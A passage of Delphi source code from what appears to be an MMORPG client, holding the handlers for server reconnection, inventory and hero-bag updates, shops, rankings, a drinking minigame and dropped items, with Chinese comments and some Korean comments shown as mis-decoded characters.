      CSocket.Active := FALSE; //肺弊牢俊 楷搬等 家南 摧澜
      CSocket.Host := '';
      CSocket.Port := 0;
      WaitAndPass(500); //0.5檬悼救 扁促覆

      g_ConnectionStep := cnsPlay;
      With CSocket Do
      Begin
        Address := g_sRunServerAddr;
        Port := g_nRunServerPort;
        Active := TRUE;
      End;
    End
    Else
    Begin
      SocStr := '';
      BufferStr := '';
      If CSocket.Socket.Connected Then
        CSocket.Socket.SendText('$R' + addr + '/' + sport + '%');

      g_ConnectionStep := cnsPlay;
      ClearBag; //啊规 檬扁拳
      DScreen.ClearChatBoard; //盲泼芒 檬扁拳
      DScreen.ChangeScene(stLoginNotice);

      WaitAndPass(500); //0.5檬悼救 扁促覆
      SendRunLogin;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetStartPlay'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetReconnect(body: String);
Var
  str, addr, sport: String;
Begin
  Try //程序自动增加
    str := DecodeString(body);
    sport := GetValidStr3(str, addr, ['/']);

    If Not BoOneClick Then
    Begin
      If g_boBagLoaded Then
        Savebags('.\Data\' + g_sServerName + '.' + CharName + '.itm',
          @g_ItemArr);
      g_boBagLoaded := FALSE;

      g_boServerChanging := TRUE;
      CSocket.Active := FALSE; //肺弊牢俊 楷搬等 家南 摧澜
      CSocket.Host := '';
      CSocket.Port := 0;

      WaitAndPass(500); //0.5檬悼救 扁促覆

      g_ConnectionStep := cnsPlay;
      With CSocket Do
      Begin
        Address := addr;
        Port := Str_ToInt(sport, 0);
        Active := TRUE;
      End;

    End
    Else
    Begin
      If g_boBagLoaded Then
        Savebags('.\Data\' + g_sServerName + '.' + CharName + '.itm',
          @g_ItemArr);
      g_boBagLoaded := FALSE;

      SocStr := '';
      BufferStr := '';
      g_boServerChanging := TRUE;

      If CSocket.Socket.Connected Then //立加 辆丰 脚龋 焊辰促.
        CSocket.Socket.SendText('$C' + addr + '/' + sport + '%');

      WaitAndPass(500); //0.5檬悼救 扁促覆
      If CSocket.Socket.Connected Then //犁立..
        CSocket.Socket.SendText('$R' + addr + '/' + sport + '%');

      g_ConnectionStep := cnsPlay;
      ClearBag; //啊规 檬扁拳
      DScreen.ClearChatBoard; //盲泼芒 檬扁拳
      DScreen.ChangeScene(stLoginNotice);

      WaitAndPass(300); //0.5檬悼救 扁促覆
      ChangeServerClearGameVariables;

      SendRunLogin;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetReconnect'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetMapDescription(Msg: TDefaultMessage; sBody: String);
Var
  sTitle: String;
Begin
  Try //程序自动增加
    sBody := DecodeString(sBody);
    sBody := GetValidStr3(sBody, sTitle, [#13]);
    g_sMapTitle := sTitle;
    //g_nMapMusic:=Msg.Recog;
    //PlayMapMusic(True);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetMapDescription');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetPlayDrink(Msg: TDefaultMessage; sBody: String);
Var
  i: integer;
  TempStr: String;
Begin
  Case Msg.Param Of
    6:
      Begin
        FrmDlg.m_CompeteDrinkNpcCount := msg.Series;
        FrmDlg.m_CompeteDrinkSelfCount := msg.Tag;
        If Msg.Recog = 1 Then
          FrmDlg.m_CompeteSelfDrink := True
        Else
          FrmDlg.m_CompeteNpcDrink := True;
        FrmDlg.m_PlayDrinkTime := GetTickCount;
        If (FrmDlg.m_CompeteDrinkNpcCount >= 200) Or
          (FrmDlg.m_CompeteDrinkSelfCount >= 200) Then
        Begin
          FrmDlg.DDrink1.Visible := False;
          FrmDlg.DDrink2.Visible := False;
          FrmDlg.DDrink3.Visible := False;
          FrmDlg.DDrink4.Visible := False;
          FrmDlg.DDrink5.Visible := False;
          FrmDlg.DDrink6.Visible := False;
        End;
        //FrmDlg.m_CompeteDrinkType:=pdDD;
        FrmDlg.m_PlayDrinkStartIdx := 0;
      End;
    5:
      Begin
        FrmDlg.m_CompeteButTime := GetTickCount;
        FrmDlg.m_CompeteNpcIdx := msg.Series;
        FrmDlg.m_COmpeteSelfIdx := msg.Tag;
        FrmDlg.m_ComPeteWilIdx := msg.Recog;
        FrmDlg.DCompeteDrinkBG.Visible := True;
        If msg.Recog = 0 Then
        Begin
          FrmDlg.m_CompeteDrinkType := pdSelf;
        End
        Else If msg.Recog = 1 Then
        Begin
          FrmDlg.m_CompeteDrinkType := pdNPC;
        End;
        FrmDlg.m_CompeteDrinkNpcSelectMaxTime := GetTickCount;
        FrmDlg.m_CompeteDrinkNpcSelectTime := GetTickCount + 1500;
        FrmDlg.m_CompeteDrinkDrinkIdx := Random(6);
        ;
      End;
    4:
      Begin
        If Msg.Tag In [0, 1, 2] Then
          FrmDlg.m_CompeteDrinkIdx := Msg.Tag
        Else
          FrmDlg.m_CompeteDrinkIdx := 0;
        FrmDlg.m_PlayDrinkNpc := Msg.Recog;
        FrmDlg.m_CompeteDrinkStart := False;
        FrmDlg.m_CompeteDrinkName := DecodeString(sBody);
        FrmDlg.CloseMDlg;
        FrmDlg.DDrink1.Visible := True;
        FrmDlg.DDrink2.Visible := True;
        FrmDlg.DDrink3.Visible := True;
        FrmDlg.DDrink4.Visible := True;
        FrmDlg.DDrink5.Visible := True;
        FrmDlg.DDrink6.Visible := True;
        FrmDlg.m_CompeteDrinkIdxList.Clear;
        FrmDlg.m_CompeteDrinkIdxList.Add(Pointer(0));
        FrmDlg.m_CompeteDrinkIdxList.Add(Pointer(1));
        FrmDlg.m_CompeteDrinkIdxList.Add(Pointer(2));
        FrmDlg.m_CompeteDrinkIdxList.Add(Pointer(3));
        FrmDlg.m_CompeteDrinkIdxList.Add(Pointer(4));
        FrmDlg.m_CompeteDrinkIdxList.Add(Pointer(5));
        FrmDlg.m_CompeteDrinkTempNpcCount := 0;
        FrmDlg.m_CompeteDrinkTempSelfCount := 0;
        FrmDlg.m_CompeteDrinkTempTime := GetTickCount;
        FrmDlg.DCompeteDrinkGo.Visible := False;
        FrmDlg.m_CompeteDrinkButTime := GetTickCount;
        FrmDlg.m_PlayDrinkStart := False;
        FrmDlg.m_CompeteNpcDrink := False;
        FrmDlg.m_CompeteSelfDrink := False;
        FrmDlg.m_CompeteDrinkDrinkIdx := 255;
        FrmDlg.m_CompeteDrinkButIdx := 255;
        FrmDlg.m_CompeteDrinkType := pdDD;
        FrmDlg.m_CompeteDrinkNpcCount := 0;
        FrmDlg.m_CompeteDrinkSelfCount := 0;
        FrmDlg.DCompeteDrink.Visible := True;
        FrmDlg.DCompeteDrinkBG.Visible := False;
        FrmDlg.DPlayDrink.Visible := False;
      End;
    0:
      Begin
        If Msg.Tag In [0, 1, 2] Then
          FrmDlg.m_PlayDrinkIdx := Msg.Tag
        Else
          FrmDlg.m_PlayDrinkIdx := 0;
        FrmDlg.m_PlayDrinkNpc := Msg.Recog;
        FrmDlg.m_PlayDrinkStart := False;
        FrmDlg.m_PlayDrinkSelectMenuStr := '';
        FrmDlg.m_PlayDrinkName := DecodeString(sBody);
        FrmDlg.CloseMDlg;
        FillChar(FrmDlg.m_PlayDrinkItem, SizeOf(FrmDlg.m_PlayDrinkItem), #0);
        FrmDlg.DPlayDrinkDrink.Visible := True;
        FrmDlg.DCompeteDrink.Visible := False;
        FrmDlg.DPlayDrink.Visible := True;
      End;
    1:
      Begin
        FrmDlg.LastestClickTime := 0;
        If Msg.Tag = 1 Then
        Begin
          FrmDlg.m_PlayDrinkMsgTop := DecodeString(sBody);
          For i := 0 To FrmDlg.m_PlayDrinkPointsTop.Count - 1 Do
            Dispose(pTClickPoint(FrmDlg.m_PlayDrinkPointsTop[i]));
          FrmDlg.m_PlayDrinkPointsTop.Clear;
          FrmDlg.m_PlayDrinkAddPointsTop := True;
        End
        Else
        Begin
          FrmDlg.m_PlayDrinkMsgBoom := DecodeString(sBody);
          For i := 0 To FrmDlg.m_PlayDrinkPointsBoom.Count - 1 Do
            Dispose(pTClickPoint(FrmDlg.m_PlayDrinkPointsBoom[i]));
          FrmDlg.m_PlayDrinkPointsBoom.Clear;
          FrmDlg.m_PlayDrinkAddPointsBoom := True;
        End;
      End;
    2:
      Begin
        FrmDlg.CloseDrink;
      End;
    3:
      Begin
        DecodeBuffer(sBody, @g_GetHero, SizeOf(TClientGetHero));
        FrmDlg.DGetHero1.Visible := (g_GetHero.HeroName1 <> '');
        FrmDlg.DGetHero2.Visible := (g_GetHero.HeroName2 <> '');
        FrmDlg.DGetHero.Visible := True;
      End;
  End;
End;

Procedure TfrmMain.ClientGetGameGoldName(Msg: TDefaultMessage; sBody: String);
Var
  sData: String;
Begin
  Try //程序自动增加
    If sBody <> '' Then
    Begin
      sBody := DecodeString(sBody);
      sBody := GetValidStr3(sBody, g_sGameGoldName, [#13]);
      sBody := GetValidStr3(sBody, sData, [#13]);
      If sData <> '' Then
      Begin
        g_sGamePointName := sData;
        sBody := GetValidStr3(sBody, sData, [#13]);
        If sData <> '' Then
        Begin
          g_sGameDiamond := sData;
          g_sGameGird := sBody;
        End;
      End
      Else
        g_sGamePointName := sBody
    End;
    g_MySelf.m_nGameGold := Msg.Recog;
    g_MySelf.m_nGamePoint := MakeLong(Msg.Param, Msg.Tag);
    g_MySelf.m_nGloryPoint := msg.Series;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetGameGoldName');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetAdjustBonus(bonus: integer; body: String);
Var
  str1, str2, str3: String;
Begin
  Try //程序自动增加
    g_nBonusPoint := bonus;
    body := GetValidStr3(body, str1, ['/']);
    str3 := GetValidStr3(body, str2, ['/']);
    DecodeBuffer(str1, @g_BonusTick, sizeof(TNakedAbility));
    DecodeBuffer(str2, @g_BonusAbil, sizeof(TNakedAbility));
    DecodeBuffer(str3, @g_NakedAbil, sizeof(TNakedAbility));
    FillChar(g_BonusAbilChg, sizeof(TNakedAbility), #0);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetAdjustBonus');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetHeroAddItem(body: String;bShow:Byte);
Var
  cu: TClientItem;
Begin
  Try //程序自动增加
    If body <> '' Then
    Begin
      DecodeBuffer(body, @cu, sizeof(TClientItem));
      AddItemHeroBag(cu);
      if bShow=0 then
      DScreen.AddSysMsg(cu.S.Name + ' 在英雄背包被发现');
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetHeroAddItem');
    //程序自动增加
  End; //程序自动增加
End;

procedure TfrmMain.ClientChangeMagic(Magid: Integer; body: string);
Var
  poldcm,pnewcm:PTClientMagic;
  i:integer;
Begin
  Try //程序自动增加
      For i := g_MagicList.Count - 1 Downto 0 Do
    Begin
     poldcm:=PTClientMagic(g_MagicList[i]);
      If poldcm.Def.wMagicId = magid Then
      Begin
        new(pnewcm);
        DecodeBuffer(body, @(pnewcm^), sizeof(TClientMagic));
        poldcm.Def:=pnewcm.Def;
        g_MyMagic[Magid]:=nil;
        g_MyMagic[pnewcm.Def.wMagicID] :=pnewcm;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientChangeMagic'); //程序自动增加
  End; //程序自动增加

end;

Procedure TfrmMain.ClientGetAddItem(body: String;bShow:Byte);
Var
  cu: TClientItem;
Begin
  Try //程序自动增加
    If body <> '' Then
    Begin
      DecodeBuffer(body, @cu, sizeof(TClientItem));
      AddItemBag(cu);
      if bShow=0 then
      DScreen.AddSysMsg(cu.S.Name + ' 被发现');
      //DScreen.AddSysMsg (Format('%d %d',[cu.S.StdMode,cu.S.Shape]));
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetAddItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetUpdateItem(body: String);
Var
  i: integer;
  cu: TClientItem;
Begin
  Try //程序自动增加
    If body <> '' Then
    Begin
      DecodeBuffer(body, @cu, sizeof(TClientItem));
      UpdateItemBag(cu);
      For i := 0 To 12 Do
      Begin
        If (g_UseItems[i].S.Name = cu.S.Name) And (g_UseItems[i].MakeIndex =
          cu.MakeIndex) Then
        Begin
          g_UseItems[i] := cu;
        End;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetUpdateItem'); //程序自动增加
  End; //程序自动增加
End;

procedure TfrmMain.ClientHeroChangeMagic(Magid: Integer; body: string);
Var
  poldcm,pnewcm:PTClientMagic;
  i:integer;
Begin
  Try //程序自动增加
      For i := g_MagicList.Count - 1 Downto 0 Do
    Begin
     poldcm:=PTClientMagic(g_HeroMagicList[i]);
      If poldcm.Def.wMagicId = magid Then
      Begin
        new(pnewcm);
        DecodeBuffer(body, @(pnewcm^), sizeof(TClientMagic));
        poldcm.Def:=pnewcm.Def;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientChangeMagic'); //程序自动增加
  End; //程序自动增加
end;

Procedure TfrmMain.ClientGetHeroDelItem(body: String);
Var
  i: integer;
  cu: TClientItem;
Begin
  Try //程序自动增加
    If body <> '' Then
    Begin
      DecodeBuffer(body, @cu, sizeof(TClientItem));
      DelHeroItemBag(cu.S.Name, cu.MakeIndex);
      For i := 0 To 12 Do
      Begin
        If (g_HeroUseItems[i].S.Name = cu.S.Name) And
          (g_HeroUseItems[i].MakeIndex = cu.MakeIndex) Then
        Begin
          g_HeroUseItems[i].S.Name := '';
        End;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetHeroDelItem');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetDelItem(body: String);
Var
  i: integer;
  cu: TClientItem;
Begin
  Try //程序自动增加
    If body <> '' Then
    Begin
      DecodeBuffer(body, @cu, sizeof(TClientItem));
      DelItemBag(cu.S.Name, cu.MakeIndex);
      For i := 0 To 13 Do
      Begin
        If (g_UseItems[i].S.Name = cu.S.Name) And (g_UseItems[i].MakeIndex =
          cu.MakeIndex) Then
        Begin
          g_UseItems[i].S.Name := '';
        End;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetDelItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetDelItems(body: String);
Var
  i, iindex: integer;
  str, iname: String;
  //   cu: TClientItem;
Begin
  Try //程序自动增加
    body := DecodeString(body);
    While body <> '' Do
    Begin
      body := GetValidStr3(body, iname, ['/']);
      body := GetValidStr3(body, str, ['/']);
      If (iname <> '') And (str <> '') Then
      Begin
        iindex := Str_ToInt(str, 0);
        DelItemBag(iname, iindex);
        For i := 0 To 13 Do
        Begin
          If (g_UseItems[i].S.Name = iname) And (g_UseItems[i].MakeIndex =
            iindex) Then
          Begin
            g_UseItems[i].S.Name := '';
          End;
        End;
      End
      Else
        break;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetDelItems'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetHeroBagCount(Size: Integer);
Begin
  Try //程序自动增加
    With FrmDlg Do
    Begin
      Case Size Of
        0..10:
          Begin
            g_HeroBagSize := 10;
            HeroBagImage := 375;
            DHeroItemGrid.RowCount := 2;
            DHeroItemBag.SetImgIndex(g_WMain3Images, 375);
          End;
        11..20:
          Begin
            g_HeroBagSize := 20;
            HeroBagImage := 376;
            DHeroItemGrid.RowCount := 4;
            DHeroItemBag.SetImgIndex(g_WMain3Images, 376);
          End;
        21..30:
          Begin
            g_HeroBagSize := 30;
            HeroBagImage := 377;
            DHeroItemGrid.RowCount := 6;
            DHeroItemBag.SetImgIndex(g_WMain3Images, 377);
          End;
        31..35:
          Begin
            g_HeroBagSize := 35;
            HeroBagImage := 378;
            DHeroItemGrid.RowCount := 7;
            DHeroItemBag.SetImgIndex(g_WMain3Images, 378);
          End;
      Else
        Begin
          g_HeroBagSize := 40;
          HeroBagImage := 379;
          DHeroItemGrid.RowCount := 8;
          DHeroItemBag.SetImgIndex(g_WMain3Images, 379);
        End;
      End;
      DHeroItemGrid.Height := 30 * DHeroItemGrid.RowCount + 14;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetHeroBagCount');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetHeroBagItmes(body: String);
Var
  str: String;
  cu: TClientItem;
Begin
  Try //程序自动增加
    FillChar(g_HeroItemArr, sizeof(TClientItem) * MAXBAGITEMCL, #0);
    While TRUE Do
    Begin
      If body = '' Then
        break;
      body := GetValidStr3(body, str, ['/']);
      DecodeBuffer(str, @cu, sizeof(TClientItem));
      AddItemHeroBag(cu);
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetHeroBagItmes');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetSellList(nIdx, nNowPage, nMaxPage, nFind: Integer;
  body: String);
Var
  str: String;
  i: integer;
Begin
  Try //程序自动增加
    FillChar(g_SellList, SizeOf(TClientPlacing) * 10, #0);
    FrmDlg.m_SellIdx := nIdx;
    FrmDlg.m_SellFind := nFind;
    FrmDlg.m_SellPageIdx := nNowPage;
    FrmDlg.m_SellPageMax := nMaxPage;
    FrmDlg.m_SellClientPlacing.Item.S.Name := '';
    FrmDlg.m_nPlacingIdx := -1;
    i := 0;
    While TRUE Do
    Begin
      If I > High(g_SellList) Then
        break;
      If body = '' Then
        break;
      body := GetValidStr3(body, str, ['/']);
      DecodeBuffer(str, @g_SellList[I], sizeof(TClientPlacing));
      inc(I);
    End;
    FrmDlg.ShopSellWindows;
    If nFind = 1 Then
      FrmDlg.EdPlacingEdit.Text := FrmDlg.m_SellFindStr;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetSellList'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetTaxisList(nIdx, nNowPage, nMaxPage: integer; body:
  String);
Var
  str: String;
  i: integer;
Begin
  Try //程序自动增加
    If (nNowPage = 999) And (body = '') Then
    Begin
      FrmDlg.DMessageDlg('您没有上榜', [mbOK]);
      exit;
    End;
    FillChar(g_TaxisSelf, SizeOf(TTaxisSelf) * 10, #0);
    FillChar(g_TaxisHero, SizeOf(TTaxisHero) * 10, #0);
    FrmDlg.m_nPageidx := nNowPage;
    FrmDlg.m_nPageMax := nMaxPage;
    i := 0;
    While TRUE Do
    Begin
      If I > High(g_TaxisSelf) Then
        break;
      If body = '' Then
        break;
      body := GetValidStr3(body, str, ['/']);
      Case nIdx Of
        0, 2: DecodeBuffer(str, @g_TaxisSelf[I], sizeof(TTaxisSelf));
        1: DecodeBuffer(str, @g_TaxisHero[I], sizeof(TTaxisHero));
      End;
      inc(I);
    End;

  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetTaxisList'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetSelfShopItmes(body: String);
Var
  ShopItem: TShopItem;
  i: integer;
  str: String;
Begin
  Try //程序自动增加
    FillChar(g_ShopItems, SizeOf(TShopItem) * 20, #0);
    I := 0;
    While TRUE Do
    Begin
      If body = '' Then
        break;
      If i > 19 Then
        break;
      body := GetValidStr3(body, str, ['/']);
      DecodeBuffer(str, @ShopItem, sizeof(TShopItem));
      g_ShopItems[I] := ShopItem;
      Inc(I);
    End;
    g_MySelf.m_boIsShop := True;
    FrmDlg.DSelfShop.Visible := True;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetSelfShopItmes');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetShopItmes(Actor: TActor; body: String);
Var
  ShopItem: TShopItem;
  i: integer;
  str: String;
Begin
  Try //程序自动增加
    FillChar(g_ShopItems2, SizeOf(TShopItem) * 20, #0);
    i := 0;
    g_sShopName := Actor.m_sUserName;
    g_nShopX := Actor.m_nCurrX;
    g_nShopY := Actor.m_nCurrY;
    g_nShopIdx := Actor.m_nRecogId;
    While TRUE Do
    Begin
      If body = '' Then
        break;
      If i > 19 Then
        break;
      body := GetValidStr3(body, str, ['/']);
      DecodeBuffer(str, @ShopItem, sizeof(TShopItem));
      g_ShopItems2[I] := ShopItem;
      Inc(I);
    End;
    FrmDlg.DlgShopItem.Item.S.Name := '';
    FrmDlg.DSelfShop2.Visible := True;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetShopItmes'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientTakeOnItem(ItemIdx: Integer; where: Byte; boHero:
  Boolean; body: String);
Var
  cu: TClientItem;
  I: integer;
Begin
  Try //程序自动增加
    If boHero Then
    Begin
      For I := Low(g_HeroItemArr) To High(g_HeroItemArr) Do
      Begin
        If (g_HeroItemArr[I].S.Name <> '') And (g_HeroItemArr[I].MakeIndex =
          ItemIdx) Then
        Begin
          g_HeroItemArr[I].S.Name := '';
          break;
        End;
      End;
      DecodeBuffer(body, @cu, sizeof(TClientItem));
      g_HeroUseItems[where] := cu;
      ArrangeItemHerobag;
    End
    Else
    Begin
      For I := Low(g_ItemArr) To High(g_ItemArr) Do
      Begin
        If (g_ItemArr[I].S.Name <> '') And (g_ItemArr[I].MakeIndex = ItemIdx)
          Then
        Begin
          g_ItemArr[I].S.Name := '';
          break;
        End;
      End;
      DecodeBuffer(body, @cu, sizeof(TClientItem));
      g_UseItems[where] := cu;
      ArrangeItembag;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientTakeOnItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientTakeOffItem(ItemIdx: Integer; where: Byte; body:
  String);
Begin
  Try //程序自动增加
    g_UseItems[where].S.Name := '';
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientTakeOffItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetBoxsItmes2(body: String);
Var
  cu: TClientItem;
  str: String;
  idx: Integer;
Begin
  Try
    idx := 0;
    FillChar(g_OpenBoxItem, sizeof(TClientItem) * 9, #0);
    While TRUE Do
    Begin
      If (body = '') Or (idx > 8) Then
        break;
      body := GetValidStr3(body, str, ['/']);
      DecodeBuffer(str, @cu, sizeof(TClientItem));
      g_OpenBoxItem[idx] := cu;
      Inc(idx);
    End;
    FrmDlg.m_boOpenMoveEnd := False;
    FrmDlg.m_boOpenArk := False;
    FrmDlg.DOpenArk.Visible := True;
    FrmDlg.m_boOpenBox := True;
    FrmDlg.m_nOpenEffIdx := 8;
    FrmDlg.m_nOpenIdx := 8;
    FrmDlg.m_nOpenEndIdx := 8;
    FrmDlg.m_boOpenMove := False;
    FrmDlg.m_dwOpenEffTick := GetTickCount;
  Except
    DebugOutStr('[Exception] TfrmMain.ClientGetBoxsItmes');
  End;
End;

Procedure TfrmMain.ClientGetBoxsItmes(body: String);
Var
  cu: TClientItem;
  str: String;
  idx: Integer;
Begin
  Try
    idx := 0;
    FillChar(g_OpenBoxItem, sizeof(TClientItem) * 9, #0);
    While TRUE Do
    Begin
      If (body = '') Or (idx > 8) Then
        break;
      body := GetValidStr3(body, str, ['/']);
      DecodeBuffer(str, @cu, sizeof(TClientItem));
      g_OpenBoxItem[idx] := cu;
      Inc(idx);
    End;
    FrmDlg.m_boOpenBox := True;
    FrmDlg.m_nOpenEffIdx := 8;
    FrmDlg.m_nOpenIdx := 8;
    FrmDlg.m_nOpenEndIdx := 8;
    FrmDlg.m_boOpenMove := False;
    FrmDlg.m_dwOpenEffTick := GetTickCount;
  Except
    DebugOutStr('[Exception] TfrmMain.ClientGetBoxsItmes');
  End;
End;

Procedure TfrmMain.ClientGetBagItmes(body: String);
Var
  str: String;
  cu: TClientItem;
  ItemSaveArr: Array[0..MAXBAGITEMCL - 1] Of TClientItem;

  Function CompareItemArr: Boolean;
  Var
    i, j: integer;
    flag: Boolean;
  Begin
    flag := TRUE;
    For i := 0 To MAXBAGITEMCL - 1 Do
    Begin
      If ItemSaveArr[i].S.Name <> '' Then
      Begin
        flag := FALSE;
        For j := 0 To MAXBAGITEMCL - 1 Do
        Begin
          If (g_ItemArr[j].S.Name = ItemSaveArr[i].S.Name) And
            (g_ItemArr[j].MakeIndex = ItemSaveArr[i].MakeIndex) Then
          Begin
            If (g_ItemArr[j].Dura = ItemSaveArr[i].Dura) And
              (g_ItemArr[j].DuraMax = ItemSaveArr[i].DuraMax) Then
            Begin
              flag := TRUE;
            End;
            break;
          End;
        End;
        If Not flag Then
          break;
      End;
    End;
    If flag Then
    Begin
      For i := 0 To MAXBAGITEMCL - 1 Do
      Begin
        If g_ItemArr[i].S.Name <> '' Then
        Begin
          flag := FALSE;
          For j := 0 To MAXBAGITEMCL - 1 Do
          Begin
            If (g_ItemArr[i].S.Name = ItemSaveArr[j].S.Name) And
              (g_ItemArr[i].MakeIndex = ItemSaveArr[j].MakeIndex) Then
            Begin
              If (g_ItemArr[i].Dura = ItemSaveArr[j].Dura) And
                (g_ItemArr[i].DuraMax = ItemSaveArr[j].DuraMax) Then
              Begin
                flag := TRUE;
              End;
              break;
            End;
          End;
          If Not flag Then
            break;
        End;
      End;
    End;
    Result := flag;
  End;
Begin
  Try //程序自动增加
    //ClearBag;
    FillChar(g_ItemArr, sizeof(TClientItem) * MAXBAGITEMCL, #0);
    While TRUE Do
    Begin
      If body = '' Then
        break;
      body := GetValidStr3(body, str, ['/']);
      DecodeBuffer(str, @cu, sizeof(TClientItem));
      AddItemBag(cu);
    End;

    {FillChar (ItemSaveArr, sizeof(TClientItem)*MAXBAGITEMCL, #0);
    Loadbags ('.\Data\' + g_sServerName + '.' + CharName + '.itm', @ItemSaveArr);
    if CompareItemArr then begin
       Move (ItemSaveArr, g_ItemArr, sizeof(TClientItem) * MAXBAGITEMCL);
    end; }

    ArrangeItembag;
    g_boBagLoaded := TRUE;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetBagItmes'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetDiamondGird(Diamond, Gird: integer);
Begin
  Try //程序自动增加
    g_MySelf.m_nGameDiamond := Diamond;
    g_MySelf.m_nGameGird := Gird;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetDiamondGird');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetHeroDropItemFail(iname: String; sindex: integer);
Var
  pc: PTClientItem;
Begin
  Try //程序自动增加
    pc := GetDropItem(iname, sindex);
    If pc <> Nil Then
    Begin
      AddItemHeroBag(pc^);
      DelDropItem(iname, sindex);
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetHeroDropItemFail');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetDropItemFail(iname: String; sindex: integer);
Var
  pc: PTClientItem;
Begin
  Try //程序自动增加
    pc := GetDropItem(iname, sindex);
    If pc <> Nil Then
    Begin
      AddItemBag(pc^);
      DelDropItem(iname, sindex);
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetDropItemFail');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetShowItem(itemid, x, y, looks: integer; itmname:
  String);
Resourcestring
  sTest1 = '[%s]出现在坐标(%d:%d),方向%s';
Var
  I: Integer;
  DropItem: PTDropItem;
  ItemFiltrate: pTItemFiltrate;
Begin
  Try //程序自动增加
    For i := 0 To g_DropedItemList.Count - 1 Do
    Begin
      If PTDropItem(g_DropedItemList[i]).Id = itemid Then
        exit;
    End;
    New(DropItem);
    FillChar(DropItem^, SizeOf(TDropItem), #0);
    DropItem.Id := itemid;
    DropItem.X := x;
    DropItem.Y := y;
    DropItem.Looks := looks;
    DropItem.Name := itmname;
    DropItem.FlashTime := GetTickCount - LongWord(Random(3000));
    DropItem.BoFlash := FALSE;
    ItemFiltrate := GetFiltrateItem(itmname);
    If ItemFiltrate <> Nil Then
    Begin
      DropItem.boItemPick := ItemFiltrate.boItemPick;
      DropItem.boItemShow := ItemFiltrate.boItemShow;
      DropItem.boItemCorps := ItemFiltrate.boItemCorps;
      If (ItemFiltrate.boItemHit) And (g_MySelf <> Nil) And
        (g_WgInfo.boCropsItemHit) Then
        DScreen.AddChatBoardString(Format(sTest1, [itmname, x, y,
          WayTag[GetNextDirection(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, X,
            Y)]]),
            clRed,
          clWhite);
    End;
    g_DropedItemList.Add(DropItem);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetShowItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetHideItem(itemid, x, y: integer);
Var
  I: Integer;
  DropItem: PTDropItem;
Begin
  Try //程序自动增加
    For I := 0 To g_DropedItemList.Count - 1 Do
    Begin
      DropItem := g_DropedItemList[I];
      If DropItem.Id = itemid Then
      Begin
        Dispose(DropItem);
        g_DropedItemList.Delete(I);
        break;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetHideItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetLevelItms(nCode: Integer; body: String);
Var
  cu: TClientItem;
Begin
  Try //程序自动增加
    g_LevelItemArr[1].S.Name := '';
    g_LevelItemArr[2].S.Name := '';
    Case nCode Of
      3: DScreen.AddChatBoardString('[升级失败]：装备无任何变化。',
          clwhite, clRed);
      4: DScreen.AddChatBoardString('[升级失败]：装备属性降低了。',
          clwhite, clRed);
      5:
        Begin
          DScreen.AddChatBoardString('[升级失败]：装备消失了。',
            clwhite, clRed);
          g_LevelItemArr[0].S.Name := '';
